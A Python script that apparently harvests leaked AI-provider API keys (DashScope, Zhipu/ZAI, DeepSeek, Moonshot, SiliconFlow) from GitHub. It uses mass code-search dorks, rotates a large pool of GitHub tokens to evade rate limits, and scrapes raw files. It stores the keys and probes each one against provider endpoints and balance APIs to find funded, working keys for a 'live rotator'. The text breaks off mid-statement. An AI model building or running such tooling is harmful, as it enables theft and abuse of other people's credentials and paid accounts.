"""TARGETED DASHSCOPE/ZAI/GLM family hunt — one-shot deep sweep.

57 dorks (DASHSCOPE + ZAI/ZHIPU/GLM/BIGMODEL + bailian/qwen/tongyi contexts),
10 pages each (1000 results vs 600 in gh_eternal), raw file fetch + scan,
then IMMEDIATE validation of every find (dashscope chat / zai models /
deepseek balance / moonshot / siliconflow) -> WORKING/DEAD in DB.

found='ds-hunt'. PAT pool from gh_tokens.txt.
"""
import os
KF_BASE = os.path.dirname(os.path.abspath(__file__))
os.makedirs(os.path.join(KF_BASE, "data"), exist_ok=True)
import hashlib
import json
import sqlite3
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

DB = os.environ.get("KF_DB") or os.path.join(KF_BASE, "data/keys.db")
LOG = os.path.join(KF_BASE, "data/dashscope_hunt.log")
TOKENS_FILE = os.path.join(KF_BASE, "gh_tokens.txt")
API = "https://api.github.com/search/code"
N_THREADS = 8
PAGES = 10
RAW_BUDGET = 3000

from key_patterns import scan_text

GARBAGE = ("xxxx", "your", "YOUR", "EXAMPLE", "example", "n0tr3al",
           "placeholder", "CHANGEME", "changeme", "dummy", "DUMMY",
           "abcdefghijklmnopqrst", "1234567890abcdef")

FAMILY = ("DASHSCOPE", "ZAI", "ZHIPU", "GLM", "BIGMODEL", "QWEN",
          "TONGYI", "KIMI", "MOONSHOT", "SILICONFLOW", "DEEPSEEK")

DORKS = [
    # --- DashScope / Bailian / Qwen: env-name variants (highest EV first) ---
    "DASHSCOPE_API_KEY filename:.env",
    "DASHSCOPE_API_KEY in:file",
    "DASHSCOPE_API_KEY language:python",
    "DASHSCOPE_API_KEY language:javascript",
    "DASHSCOPE_API_KEY language:typescript",
    "DASHSCOPE_API_KEY language:java",
    "DASHSCOPE_API_KEY language:go",
    "DASHSCOPE_API_KEY extension:ipynb",
    "DASHSCOPE_API_KEY extension:yml",
    "DASHSCOPE_API_KEY extension:properties",
    "DASHSCOPE_API_KEY path:.github",
    "DASHSCOPE_API_KEY path:config",
    "DASHSCOPE_API_KEY path:k8s",
    "DASHSCOPE_API_KEY filename:.env.production",
    "DASHSCOPE_API_KEY filename:.env.local",
    "DASHSCOPE_API_KEY filename:docker-compose.yml",
    "DASHSCOPE_API_KEY filename:Dockerfile",
    "DASHSCOPE_API_KEY filename:deployment.yaml",
    "DASHSCOPE_API_KEY filename:configmap",
    "DASHSCOPE_API_KEY filename:settings.py",
    "DASHSCOPE_API_KEY filename:config.py",
    "DASHSCOPE_API_KEY filename:application.yml",
    "DASHSCOPE_API_KEY filename:application.properties",
    "DASHSCOPE_API_KEY filename:bootstrap.properties",
    "DASHSCOPE_API_KEY filename:txt",
    "ALIYUN_DASHSCOPE_API_KEY",
    "QWEN_DASHSCOPE_API_KEY",
    "TONGYI_QIANWEN_API_KEY",
    "ALIBABA_CLOUD_API_KEY",
    "DASHSCOPE_LLM_API_KEY",
    "DASHSCOPE_ACCESS_KEY",
    "DASHSCOPE_KEY filename:.env",
    "DASHSCOPE_TOKEN filename:.env",
    "QWEN_API_KEY",
    "TONGYI_API_KEY",
    "BAILIAN_API_KEY",
    # --- framework / endpoint shapes ---
    "spring.ai.dashscope.api-key",
    "dashscope.api-key filename:application.yml",
    "dashscope.api_key language:python",
    "dashscope filename:nacos",
    "dashscope.aliyuncs.com api-key",
    "dashscope-intl.aliyuncs.com api_key",
    "compatible-mode/v1 dashscope sk-",
    "sk- dashscope filename:json",
    # --- Chinese-language leaks (big share of DashScope usage) ---
    "百炼 api_key",
    "通义千问 apikey",
    "灵积 apikey",
    "阿里云 dashscope 密钥",
    "dashscope 密钥 filename:env",
    # --- ModelScope (Alibaba's own hub: studios/datasets embed keys) ---
    "MODELSCOPE_API_KEY",
    "modelscope_api_token",
    "ms_token filename:.env",
    "modelscope filename:.env",
    # --- rest of FAMILY: no dorks existed for these before ---
    "MOONSHOT_API_KEY filename:.env",
    "KIMI_API_KEY",
    "api.moonshot.cn api_key",
    "DEEPSEEK_API_KEY filename:.env",
    "DEEPSEEK_API_KEY language:python",
    "SILICONFLOW_API_KEY",
    "api.siliconflow.cn api_key",
    # --- ZAI / GLM / Zhipu (proven: 183 live out of 1281 rows) ---
    "ZAI_API_KEY filename:.env",
    "ZAI_API_KEY filename:json",
    "ZAI_API_KEY filename:py",
    "ZAI_API_KEY filename:config",
    "ZAI_API_KEY language:python",
    "Z_AI_API_KEY filename:.env",
    "ZHIPU_AI_API_KEY",
    "zhipuai filename:.env",
    "ZHIPU_API_KEY filename:.env",
    "ZHIPU_API_KEY filename:json",
    "ZHIPU_API_KEY filename:py",
    "ZHIPU_API_KEY filename:config",
    "ZHIPUAI_API_KEY filename:.env",
    "ZHIPUAI_API_KEY filename:json",
    "BIGMODEL_API_KEY filename:.env",
    "BIGMODEL filename:config",
    "GLM_API_KEY filename:.env",
    "GLM_API_KEY filename:json",
    "GLM_API_KEY filename:config",
    "GLM_API_KEY filename:py",
    "GLM_API_KEY language:python",
    "bigmodel.cn filename:.env",
    "api.z.ai filename:.env",
    "z.ai api_key filename:json",
    "GLM_4_API_KEY",
    "glm coding filename:.env",
    "zai filename:application.yml",
    "GLM filename:settings",
    # --- 2026-10-08 expansion: deeper DashScope coverage ---
    "sk-sp- extension:env",
    "sk-sp- extension:txt",
    "sk-sp- extension:md",
    "sk-sp- extension:json",
    "sk-sp- extension:yml",
    "sk-sp- extension:yaml",
    "sk-sp- extension:toml",
    "sk-sp- extension:cfg",
    "sk-sp- extension:ini",
    "sk-sp- extension:conf",
    "sk-sp- path:env",
    "sk-sp- path:config",
    "sk-sp- path:.github",
    "sk-sp- path:secret",
    "sk-sp- path:deploy",
    "dashscope sk-sp- filename:.env",
    "dashscope compatible-mode api-key",
    "compatible-mode endpoint dashscope",
    "ALIBABACLOUD compatible-mode api-key",
    "aliyun dashscope api-key gist",
    "dashscope-intl api-key gist",
    # Chinese cloud platforms (QiNiu/Tencent/Huawei often expose DashScope)
    "百炼 密钥 filename:.env",
    "通义千问 密钥 filename:text",
    "阿里云 密钥 dashscope",
    # new deployment patterns
    "sk-sp- filename:docker-compose",
    "sk-sp- filename:kustomization",
    "sk-sp- filename:helm",
    "DASHSCOPE_API_KEY filename:.env.example",
]

# --- programmatic expansion of the unique search surface --------------------
# GitHub code search hands every node the same list and the fleet folds it into
# 8 slices: run_imba.py:162 (--shards default=8), :179 (shard %= args.shards),
# :185 (lanes by crc32(name) % shards), :209-210 (KF_DORK_MOD / KF_DORK_SHARD),
# consumed by the i % MOD == SHARD slice below. With 88 dorks that is 8 slices of
# 11, so ~174 of the 1390 nodes issued IDENTICAL requests: ~440 unique searches
# per wave against ~76k issued, and two consecutive cycles returned +0 keys once
# the pool saturated to disjoint tokens. Breadth, not depth, is the binding
# constraint, hence the cross-product here instead of hand-adding dorks.
# Qualifier tiers follow the measured spend-sweep of 1475 unique keys, ranked by
# USABLE and NOT by alive% ("alive" was 85-100% account-in-debt):
#   .py 2/167 = 1.20% (the only non-zero cell)  .env 0/275  yaml 0/234  json 0/105
# n=2 on that cell, so tier 1 gets the depth without deleting the zero-conversion
# tiers; both USABLE hits were dedicated wrapper/config files (critic/config.py,
# dataset/LLM_api.py), which is why the entries are filename-level.
# Deliberately NO pushed:>DATE windows: recency is an untested hypothesis (the
# `lane` proxy is polluted by ISO timestamps that eternal_v10.py:903 writes into
# `found`, 4812 attribution-blind rows, and commit dates were never measured).
_DS_BASES = (
    "DASHSCOPE_API_KEY", "DASHSCOPE_APIKEY", "DASHSCOPE_API_TOKEN",
    "DASHSCOPE_KEY", "DASHSCOPE_TOKEN", "DASHSCOPE_SECRET",
    "DASHSCOPE_ACCESS_KEY", "DASHSCOPE_APP_KEY", "DASHSCOPE_SK", "DASHSCOPE_AK",
    "DASHSCOPE_LLM_API_KEY", "ALIYUN_DASHSCOPE_API_KEY", "ALIYUN_API_KEY",
    "ALIBABA_CLOUD_API_KEY", "QWEN_DASHSCOPE_API_KEY", "QWEN_API_KEY",
    "QWEN_APIKEY", "QWEN_SK", "TONGYI_API_KEY", "TONGYI_QIANWEN_API_KEY",
    "BAILIAN_API_KEY", "BAILIAN_APIKEY", "MODELSCOPE_API_KEY",
    "modelscope_api_token", "ms_token",
    "spring.ai.dashscope.api-key", "dashscope.api-key", "dashscope.api_key",
)
# Tier 1: code and wrapper files - the only artifact class that converted.
_QUALS_CODE = (
    "filename:config.py", "filename:LLM_api.py", "filename:settings.py",
    "filename:api.py", "filename:llm.py", "filename:client.py",
    "filename:main.py", "filename:app.py", "filename:utils.py",
    "filename:agent.py", "filename:chat.py", "filename:model.py",
    "filename:models.py", "filename:service.py", "filename:server.py",
    "filename:config.js", "filename:config.ts", "filename:index.js",
    "language:python", "language:javascript", "language:typescript",
    "extension:ipynb",
)
# Tier 2: measured 0% USABLE but cheap, and already seeded for one base each.
# Kept narrow so it cannot crowd tier 1 out of a slice.
_QUALS_OTHER = (
    "filename:.env", "filename:.env.production", "filename:.env.local",
    "filename:application.yml", "filename:docker-compose.yml",
    "filename:Dockerfile", "in:file",
)
_grown = list(DORKS)
_seen = set(_grown)
for _quals in (_QUALS_CODE, _QUALS_OTHER):
    for _b in _DS_BASES:
        for _q in _quals:
            _d = f"{_b} {_q}"
            if _d not in _seen:
                _seen.add(_d)
                _grown.append(_d)
DORKS = _grown

# KF_DORK_HEAD truncates to the first N entries - the hand-picked seeds - before
# any sharding. Seeds are what actually produces: on the VDS the 88-seed cycle
# found +538 keys in 38 min (~850/hour), while a MOD=8 shard of the grown list
# (111 dorks, only 11 of them seeds) found +179 in 39 min (~275/hour), and the top
# producers were all seeds: dashscope.api_key extension:ipynb +55, DASHSCOPE_API_KEY
# filename:txt +31, filename:.env +30, extension:yml +29. So a sharded box loses
# the proven queries; give it depth (HEAD=88) and let the fleet carry breadth -
# the union of the fleet's shards still covers every expanded dork.
DORK_HEAD = max(0, int(os.environ.get("KF_DORK_HEAD") or 0))
if DORK_HEAD:
    DORKS = DORKS[:DORK_HEAD]

# Fleet sharding: each node hunts a disjoint slice, so N nodes cover the list
# instead of all N repeating the same queries. Env-only knobs on purpose.
DORK_MOD = max(1, int(os.environ.get("KF_DORK_MOD") or 1))
DORK_SHARD = int(os.environ.get("KF_DORK_SHARD") or 0) % DORK_MOD
SHARD_FALLBACK = False
if DORK_MOD > 1:
    _slice = [d for i, d in enumerate(DORKS) if i % DORK_MOD == DORK_SHARD]
    SHARD_FALLBACK = not _slice
    if _slice:
        DORKS = _slice
RAW_BUDGET = int(os.environ.get("KF_RAW_BUDGET") or RAW_BUDGET)
PAGES = int(os.environ.get("KF_PAGES") or PAGES)
N_THREADS = int(os.environ.get("KF_THREADS") or N_THREADS)
# GitHub code search is ~10 req/min and runner IP ranges are throttled harder:
# without pacing every dork answers "rate" on page 1 and the run finds nothing
# (observed: CI run 37406885157 -> "HUNT done: +0 keys", all dorks p1: rate).
SEARCH_DELAY = float(os.environ.get("KF_SEARCH_DELAY") or 0)
_rate_lock = threading.Lock()
_last_search = [0.0]


def log(msg):
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n"
    with open(LOG, "a", encoding="utf-8", errors="replace") as f:
        f.write(line)
    # GitHub-hosted runners cancel a job that emits nothing for ~15 minutes.
    # A file-only log is why every CI hunt-ds run died silently at 15m04s with
    # an empty log archive (run 37371429445, job conclusion=cancelled).
    print(line, end="", flush=True)


class PATPool:
    def __init__(self):
        self.tokens = []
        self.dead = set()
        # Seeded per process on purpose. Every consumer used to start at index 0,
        # so the VPS loop, the CI run and any local sweep walked the same head of
        # the token list in lockstep and collapsed the 10/min code_search budget
        # of the first tokens: measured 194 of the last 200 dorks answering "rate"
        # on the VPS while the pool held ~2440 live PATs.
        self._i = (os.getpid() * 2654435761) % (1 << 20)
        self._lock = threading.Lock()
        try:
            with open(TOKENS_FILE, encoding="utf-8") as f:
                for line in f:
                    t = line.strip()
                    if t.startswith("ghp_") and t not in self.tokens:
                        self.tokens.append(t)
        except Exception:
            pass
        try:
            r = subprocess.run(["gh", "auth", "token"], capture_output=True,
                               text=True, timeout=5)
            t = r.stdout.strip()
            if t and t not in self.tokens:
                self.tokens.append(t)
        except Exception:
            pass

    def next(self):
        with self._lock:
            live = [t for t in self.tokens if t not in self.dead]
            if not live:
                return ""
            t = live[self._i % len(live)]
            self._i += 1
            return t

    def mark_dead(self, t):
        with self._lock:
            self.dead.add(t)


POOL = PATPool()


def rest_search(query, page):
    if SEARCH_DELAY > 0:
        # global spacing across threads, so N_THREADS does not multiply the rate
        with _rate_lock:
            wait = SEARCH_DELAY - (time.time() - _last_search[0])
            if wait > 0:
                time.sleep(wait)
            _last_search[0] = time.time()
    tok = POOL.next()
    if not tok:
        return None, "no tokens"
    try:
        params = {"q": query, "per_page": 100, "page": page,
                   "sort": "indexed", "order": "desc"}
        headers = {"Authorization": f"Bearer {tok}",
                   "Accept": "application/vnd.github.text-match+json",
                   "User-Agent": "keyfarm"}
        r = requests.get(API, params=params, headers=headers,
            timeout=30)
        if r.status_code == 401:
            POOL.mark_dead(tok)
            return None, "401"
        if r.status_code in (403, 429):
            # per-token search limit (10/min): rotate to a fresh token
            tok2 = POOL.next()
            headers2 = {**headers, "Authorization": f"Bearer {tok2}"}
            r2 = requests.get(API, params=params, headers=headers2,
                             timeout=30)
            if r2.status_code == 200:
                return r2.json().get("items", []), "ok"
            return None, "rate"
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        return r.json().get("items", []), "ok"
    except Exception as e:
        return None, repr(e)


conn = sqlite3.connect(DB, timeout=120, check_same_thread=False,
                       isolation_level=None)
lock = threading.Lock()
dblock = threading.Lock()
seen_files = set()
raw_fetched = [0]
found_keys = {}     # hash -> (val, prov, repo) collected this run


# Tri-state: None = not probed yet, True/False = VERIFIED availability. Never
# assume the migration worked - see _ensure_recency_columns.
_recency_ready = [None]


def _ensure_recency_columns():
    """Add first_seen/last_seen if possible, and report whether they really exist.

    Why the columns: the age of a find is otherwise unknowable. hash is UNIQUE and
    every lane upserts, so `id` encodes FIRST-insert order - a leak re-found today
    keeps the low id it got months ago. first_seen/last_seen are the minimum
    instrumentation for the arrearage-vs-recency question (34 of 44 alive keys in
    one CI run were unfunded).

    Why the result is verified, not assumed: swallowing the ALTER error and
    proceeding would make every db_upsert raise "table keys has no column named
    last_seen" whenever the migration failed for a non-duplicate reason - a busy
    WAL (run_imba.py documents parser+validator+ds-hunt+8 lanes on this one file),
    a read-only mount, or first_seen landing while last_seen did not. work() catches
    that per dork, so the run would print "HUNT done: +0 keys", exit 0, loop forever
    and look healthy to systemd: a silent fleet-wide zero-yield failure.
    """
    if _recency_ready[0] is not None:
        return _recency_ready[0]
    # Double-checked: N_THREADS workers call db_upsert concurrently, and ds-hunt
    # also runs standalone in CI where run_imba's pre-spawn migration never ran.
    # Without the lock two threads can interleave ALTER/PRAGMA and latch the flag
    # to False on a DB that does have the columns - permanently, for that process.
    with dblock:
        if _recency_ready[0] is not None:
            return _recency_ready[0]
        for col in ("first_seen", "last_seen"):
            try:
                conn.execute("ALTER TABLE keys ADD COLUMN %s TEXT" % col)
            except Exception:
                pass    # usually "duplicate column name" - verified below anyway
        try:
            cols = {r[1] for r in conn.execute("PRAGMA table_info(keys)")}
            ok = {"first_seen", "last_seen"} <= cols
        except Exception:
            ok = False
        if not ok:
            log("recency columns unavailable - falling back to the 6-column upsert")
        _recency_ready[0] = ok
    return ok


def db_upsert(key, prov, repo):
    h = hashlib.sha1(key.encode()).hexdigest()[:16]
    now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    if _ensure_recency_columns():
        with dblock:
            # last_seen is bumped on EVERY re-find (that is the measurement);
            # status/found/repo still only move for ERR rows, exactly as before.
            conn.execute(
                "INSERT INTO keys (hash, val, prov, status, found, repo, "
                "first_seen, last_seen) VALUES (?,?,?,?,?,?,?,?) "
                "ON CONFLICT(hash) DO UPDATE SET last_seen=excluded.last_seen, "
                "status=CASE WHEN keys.status IN ('ERR') THEN 'NEW' ELSE keys.status END, "
                "found=CASE WHEN keys.status IN ('ERR') THEN excluded.found ELSE keys.found END, "
                "repo=CASE WHEN keys.status IN ('ERR') THEN excluded.repo ELSE keys.repo END",
                (h, key, prov, "NEW", "ds-hunt", repo, now, now))
    else:
        with dblock:
            # fail open to the pre-instrumentation behaviour: a missing column must
            # cost recency data, never the harvest
            conn.execute(
                "INSERT INTO keys (hash, val, prov, status, found, repo) "
                "VALUES (?,?,?,?,?,?) "
                "ON CONFLICT(hash) DO UPDATE SET status='NEW', "
                "found=excluded.found, repo=excluded.repo "
                "WHERE keys.status IN ('ERR')",
                (h, key, prov, "NEW", "ds-hunt", repo))
    return h


def work(q):
    n_new = 0
    for page in range(1, PAGES + 1):
        items, st = rest_search(q, page)
        if items is None:
            if st == "rate":
                time.sleep(15)
                items, st = rest_search(q, page)
            if items is None:
                log(f"  {q!r} p{page}: {st}")
                return n_new
        for h in items:
            repo = h.get("repository", {}).get("full_name", "?")
            path = h.get("path", "")
            texts = [json.dumps(h.get("text_matches", []))]
            fp = (repo, path)
            with lock:
                if fp in seen_files:
                    continue
                seen_files.add(fp)
                if raw_fetched[0] < RAW_BUDGET:
                    raw_fetched[0] += 1
                    do_raw = True
                else:
                    do_raw = False
            if do_raw:
                try:
                    raw = requests.get(
                        f"https://raw.githubusercontent.com/{repo}/HEAD/{path}",
                        timeout=20)
                    if raw.status_code == 200 and len(raw.text) < 2_000_000:
                        texts.append(raw.text)
                except Exception:
                    pass
            for text in texts:
                for prov, key in scan_text(text):
                    if isinstance(key, tuple):
                        key = key[0]
                    if not key or key in found_keys \
                       or any(g in key for g in GARBAGE) or len(key) < 30:
                        continue
                    # family filter: keep only the targeted shapes
                    if prov not in FAMILY:
                        continue
                    hsh = db_upsert(key, prov, f"{repo}/{path}")
                    with lock:
                        found_keys[hsh] = (key, prov, f"{repo}/{path}")
                    n_new += 1
        time.sleep(2.5)
    return n_new


# ── immediate validation of this run's finds ─────────────────────────────
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36"}
# DashScope keys are REGION-BOUND: a Singapore key probed on the Beijing host
# answers 401 InvalidApiKey, so single-region probing silently kills live keys.
# GET /v1/models authenticates without spending one token — the old probe POSTed
# a chat completion per candidate, which burned quota and, once the free tier was
# gone, reported a live-but-unentitled key as dead.
DS_REGIONS = (
    ("beijing", ("https://dashscope.aliyuncs.com/api/v1/models",
                 "https://dashscope.aliyuncs.com/compatible-mode/v1/models")),
    ("intl", ("https://dashscope-intl.aliyuncs.com/api/v1/models",
              "https://dashscope-intl.aliyuncs.com/compatible-mode/v1/models")),
    ("us", ("https://dashscope-us.aliyuncs.com/api/v1/models",
            "https://dashscope-us.aliyuncs.com/compatible-mode/v1/models")),
    ("hk", ("https://cn-hongkong.dashscope.aliyuncs.com/api/v1/models",
            "https://cn-hongkong.dashscope.aliyuncs.com/compatible-mode/v1/models")),
)
DS_PLAN_REGIONS = (
    ("token-plan", ("https://token-plan.cn-beijing.maas.aliyuncs.com/api/v1/models",
                    "https://token-plan.cn-beijing.maas.aliyuncs.com/"
                    "compatible-mode/v1/models")),
    ("coding", ("https://coding.dashscope.aliyuncs.com/v1/models",)),
)
DS_ALIVE_WORDS = ("model.accessdenied",)
# only key-level quota proves the key authenticated; RateQuota/BurstRate and a
# bare 429 are caller/IP-side (WAF) and prove nothing about the key
# "insufficient_quota" deliberately NOT here: classify_ds tests DS_BILLING_WORDS
# (which contains bare "insufficient") before the 429 branch, so it could never
# fire - and semantically an exhausted balance IS billing, i.e. arrearage, not
# proof of life. Only allocation/user throttling codes are key-level.
DS_KEY_QUOTA_WORDS = ("throttling.allocationquota", "throttling.user")
# Model Studio error matrix: 403 Model.AccessDenied means the key AUTHENTICATED
# and is simply not entitled to that model, so it is alive - and it is the only
# body word that may prove that. "throttling", "rate limit" and "too many
# requests" sat here once as a SECOND DS_ALIVE_WORDS assignment that silently
# shadowed the definition above, which made classify_ds return WORKING for any
# WAF / secondary-limit body ("You have exceeded a secondary rate limit",
# "Too Many Requests" from an edge) and minted fake-live keys fleet-wide.
# Key-level quota is DS_KEY_QUOTA_WORDS' job and only on a 429; a bare 429 or an
# IP-side throttle says nothing about the key, so it must stay non-WORKING.
DS_FREETIER_WORDS = ("allocationquota.freetieronly", "accessdenied.unpurchased",
                     "freetieronly")
DS_BILLING_WORDS = ("arrearage", "prepaidbilloverdue", "postpaidbilloverdue",
                    "insufficient", "欠费")


def ds_model_count(payload):
    """Model count from either shape: native {"output":{"total":N,"models":[...]}}
    (measured: total=519) or compat {"data":[...]} (measured: 262 entries)."""
    if not isinstance(payload, dict):
        return 0
    out = payload.get("output")
    if isinstance(out, dict):
        return int(out.get("total") or len(out.get("models") or []))
    return len(payload.get("data") or [])


def classify_ds(code, body=""):
    """Map one DashScope models-list response onto the audit vocabulary.

    404 / HTML means the ENDPOINT is wrong for that region, not that the key is
    bad. Counting it as a reject would mark every DashScope candidate DEAD the
    day Alibaba moves or drops a path, so it gets its own class.
    """
    text = str(body or "")[:600]
    low = text.lower()
    if code == 200:
        return ("WORKING", "")
    if code is None or code == 404 \
            or low.lstrip().startswith(("<!doctype", "<html")):
        return ("endpoint_error", code)
    if any(w in low for w in DS_BILLING_WORDS):
        return ("arrearage", code)
    if any(w in low for w in DS_FREETIER_WORDS):
        return ("free_tier", code)
    if code == 429:
        if any(w in low for w in DS_KEY_QUOTA_WORDS):
            return ("WORKING", "throttled-key-quota")
        return ("throttled", code)     # row stays NEW, validator retries
    if any(w in low for w in DS_ALIVE_WORDS):
        return ("WORKING", "model-restricted")
    return ("reject", code)


def probe_dashscope(k):
    """Validate against every regional endpoint; zero token spend.

    Native /api/v1/models first (documented), OpenAI-compat /v1/models as the
    fallback shape. Both measured 200 on Beijing with a live key; intl/hk/us
    answered 401 InvalidApiKey for that same key, which is the region binding.
    """
    regions = (DS_PLAN_REGIONS + DS_REGIONS) if k.startswith("sk-sp-") else DS_REGIONS
    seen = []
    for name, urls in regions:
        for url in urls:
            try:
                r = requests.get(url, headers={**UA, "Authorization": f"Bearer {k}"},
                                 timeout=6)
            except Exception:
                seen.append(("net", name))
                continue
            if r.status_code == 200 and not _key_attributed(url):
                seen.append(("authblind", name))
                continue        # try the sibling URL shape in this region
            st, info = classify_ds(r.status_code, r.text)
            if st == "endpoint_error":
                seen.append((st, name))
                continue        # try the other URL shape for this region
            if st == "WORKING":
                try:
                    n = ds_model_count(r.json())
                except Exception:
                    n = 0
                tag = f" {info}" if info else ""
                return ("WORKING", f"dashscope {name} models={n}{tag}")
            seen.append((st, name))
            break               # non-200 body words ARE key-attributed
    if k.startswith("sk-sp-") and any(s[0] == "authblind" for s in seen):
        # Tier 1 is structurally blind for Token/Coding Plan keys: the plan host
        # coding.dashscope.aliyuncs.com/v1/models answers 200 to a garbage key
        # AND with no Authorization header at all (measured 2026-10-06), while
        # the generic beijing hosts 401 every sk-sp- key. So no /models walk can
        # ever resolve a plan key; spending one token is the only verdict path.
        st, info = probe_dashscope_chat(
            k, base="https://coding.dashscope.aliyuncs.com/v1")
        if st == "WORKING":
            return ("WORKING", f"dashscope coding-plan {info}")
        if st not in ("net", "endpoint_error"):
            seen.append((st, "coding-plan"))
    if seen and all(s[0] in ("net", "endpoint_error") for s in seen):
        return ("net", None)    # an endpoint fact is never a verdict on the key
    for want in ("arrearage", "free_tier"):
        if any(s[0] == want for s in seen):
            return (want, ",".join(n for s, n in seen if s[0] == want))
    if any(s[0] == "authblind" for s in seen):
        return ("UNVERIFIED_AUTHBLIND",
                ",".join(n for s, n in seen if s[0] == "authblind"))
    return ("reject", ",".join(n for s, n in seen if s[0] == "reject"))


ARREAR_WORDS = ("arrearage", "insufficient", "欠费", "balance", "quota",
                "exceeded", "owed", "payment")
MODEL_WORDS = ("model", "not authorized", "access denied", "unpurchased",
               "not activated", "does not exist", "invalid model")


GARBAGE_KEY = "AUTHBLINDCONTROLnotarealkey0001"


def _key_attributed(url, hdr=None):
    """True only if a garbage key is NOT served 200 by this GET endpoint.

    CDN edges intermittently serve byte-identical cached public catalogs
    (observed: beijing models=519 for 161 unrelated keys, zai models=11 for
    all 155). A bare 200 from /models proves nothing without this control.
    Fail-closed: control error -> not attributed."""
    try:
        r = requests.get(url, headers={**(hdr or UA),
                                       "Authorization": f"Bearer {GARBAGE_KEY}"},
                         timeout=8)
        return r.status_code != 200
    except Exception:
        return False


def classify_http(code, body=""):
    """Map a non-200 probe response onto the audit vocabulary.

    Throttled (429), in-arrears (400) and not-entitled-to-this-model (403/404)
    keys are alive but unusable right now. Treating them as dead is what
    inflated the DEAD count (1404 of 1440 DASHSCOPE rows) and hid recoverable
    keys, so they get their own classes and never reach status='DEAD'.
    """
    text = str(body or "")[:400].lower()
    if code == 429 or "throttl" in text or "rate limit" in text \
            or "too many requests" in text:
        return ("throttled", code)
    if code == 400 and any(w in text for w in ARREAR_WORDS):
        return ("arrearage", code)
    if code in (402, 403, 404) and any(w in text for w in MODEL_WORDS):
        return ("no_model", code)
    if code == 402 or (code == 400 and "balance" in text):
        return ("arrearage", code)
    return ("reject", code)

def probe_dashscope_chat(k, base=None, model="qwen-turbo"):
    """Tier 2: prove the key can actually run inference.

    GET /v1/models only proves authentication. Free-tier exhaustion (403
    AllocationQuota.FreeTierOnly) and arrears (400 Arrearage) surface on
    inference calls, so a key promoted into a live rotator on tier 1 alone can
    still fail at request time. Costs one token: the fleet skips it, the audit
    tool opts in with --chat-verify.
    """
    base = base or "https://dashscope.aliyuncs.com/compatible-mode/v1"
    try:
        r = requests.post(
            f"{base}/chat/completions",
            headers={**UA, "Authorization": f"Bearer {k}",
                     "Content-Type": "application/json"},
            json={"model": model,
                  "messages": [{"role": "user", "content": "hi"}],
                  "max_tokens": 1},
            timeout=20)
    except Exception:
        return ("net", None)
    if r.status_code == 200:
        return ("WORKING", f"chat-verified {model}")
    return classify_ds(r.status_code, r.text)


def probe_zai(k):
    try:
        url = "https://api.z.ai/api/paas/v4/models"
        r = requests.get(url,
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200 and not _key_attributed(url):
            return ("UNVERIFIED_AUTHBLIND", "zai catalog not key-attributed")
        if r.status_code == 200:
            try:
                n = len(r.json().get("data", []))
            except Exception:
                n = 0
            return ("WORKING", f"zai models={n}")
        return classify_http(r.status_code, r.text)
    except Exception:
        return ("net", None)


def probe_bigmodel(k):
    try:
        url = "https://open.bigmodel.cn/api/paas/v4/models"
        r = requests.get(url,
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200 and not _key_attributed(url):
            return ("UNVERIFIED_AUTHBLIND", "bigmodel catalog not key-attributed")
        if r.status_code == 200:
            return ("WORKING", "zhipu bigmodels OK")
        return classify_http(r.status_code, r.text)
    except Exception:
        return ("net", None)


def probe_deepseek(k):
    try:
        r = requests.get("https://api.deepseek.com/user/balance",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200:
            try:
                b = (r.json().get("balance_infos") or [{}])[0]
                tb = float(b.get("total_balance"))
            except Exception:
                return ("UNVERIFIED_AUTHBLIND", "deepseek balance unparsed")
            if tb <= 0:
                return ("arrearage", f"deepseek ${tb} empty")
            return ("WORKING", f"deepseek ${tb}")
        return classify_http(r.status_code, r.text)
    except Exception:
        return ("net", None)


def probe_moonshot(k):
    try:
        r = requests.get("https://api.moonshot.cn/v1/users/me/balance",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200:
            try:
                b = float(r.json().get("data", {}).get("balance"))
            except Exception:
                return ("UNVERIFIED_AUTHBLIND", "moonshot balance unparsed")
            if b <= 0:
                return ("arrearage", f"moonshot ¥{b} empty")
            return ("WORKING", f"moonshot ¥{b}")
        return classify_http(r.status_code, r.text)
    except Exception:
        return ("net", None)


def probe_siliconflow(k):
    try:
        url = "https://api.siliconflow.cn/v1/models"
        r = requests.get(url,
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200 and not _key_attributed(url):
            return ("UNVERIFIED_AUTHBLIND", "siliconflow catalog not key-attributed")
        if r.status_code == 200:
            return ("WORKING", "siliconflow models OK")
        return classify_http(r.status_code, r.text)
    except Exception:
        return ("net", None)


def validate_key(hsh, key, prov, repo):
    """Probe a found key across the family's endpoints; classify."""
    is_zai_shape = "." in key and len(key.split(".")[0]) == 32 \
        and len(key) > 40
    if not (is_zai_shape or key.startswith(("sk-", "sk-sp-"))):
        # Fail-closed: only shapes these probes can actually judge may ever be
        # written DEAD. An nvapi-/xai-/gsk_ key answers 401 on every sk- endpoint,
        # which is not evidence of death - it is evidence we asked the wrong host.
        # Leave the row NEW so a lane that owns that provider decides instead.
        return ("NEW", "no-probe-for-shape:" + str(prov or "?"))
    probes = []
    if is_zai_shape:
        probes += [("ZAI", probe_zai), ("BIGMODEL", probe_bigmodel)]
    else:  # sk- shape: dashscope/deepseek/moonshot/siliconflow share it
        probes += [("DASHSCOPE", probe_dashscope), ("DEEPSEEK", probe_deepseek),
                   ("MOONSHOT", probe_moonshot), ("SILICONFLOW", probe_siliconflow)]
    results = [(name,) + fn(key) for name, fn in probes]
    alive = [r for r in results if r[1] == "WORKING"]
    nets = [r for r in results if r[1] in ("net", "endpoint_error")]
    if alive:
        # The regex cannot separate DASHSCOPE from DEEPSEEK (identical sk-<32hex>
        # shape), so record the provider the probe actually proved, not the label
        # the pattern guessed.
        real_prov = alive[0][0]
        plan = f"{real_prov}: " + " | ".join(a[2] for a in alive)
        with dblock:
            conn.execute(
                "UPDATE keys SET status='WORKING', prov=?, plan=?, remaining=? "
